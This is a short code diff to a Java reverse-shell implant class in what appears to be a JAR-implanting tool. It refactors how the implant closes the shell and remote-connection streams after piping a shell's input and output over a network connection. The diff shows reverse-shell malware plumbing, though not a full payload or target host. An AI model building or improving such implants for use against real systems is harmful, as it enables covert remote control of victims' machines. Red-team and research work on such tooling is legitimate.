@@ -1,6 +1,6 @@
 package io.github.w1th4d.jarplant.implants;
 
-import java.io.File;
+import java.io.Closeable;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -103,11 +103,13 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
 
                 Thread pipe1 = new Thread(() -> {
                     transfer(fromShell, toRemote);
+                    closeAll(fromShell, toShell, fromRemote, toRemote, connection);
                 });
                 pipe1.start();
 
                 Thread pipe2 = new Thread(() -> {
                     transfer(fromRemote, toShell);
+                    closeAll(fromShell, toShell, fromRemote, toRemote, connection);
                 });
                 pipe2.start();
 
@@ -154,11 +156,14 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 break;
             }
         }
+    }
 
-        try {
-            input.close();
-            output.close();
-        } catch (IOException ignored) {
+    private static void closeAll(Closeable... closeables) {
+        for (Closeable closeable : closeables) {
+            try {
+                closeable.close();
+            } catch (IOException ignored) {
+            }
         }
     }
 
